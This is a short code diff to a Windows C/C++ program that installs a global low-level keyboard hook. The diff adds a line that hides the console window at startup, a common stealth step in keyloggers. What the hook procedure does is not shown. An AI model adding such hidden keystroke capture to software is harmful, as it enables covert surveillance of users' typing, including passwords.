@@ -27,6 +27,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int main() {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
     // Low-Level Keyboard Hook 설치
     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
     if (!keyboardHook) {
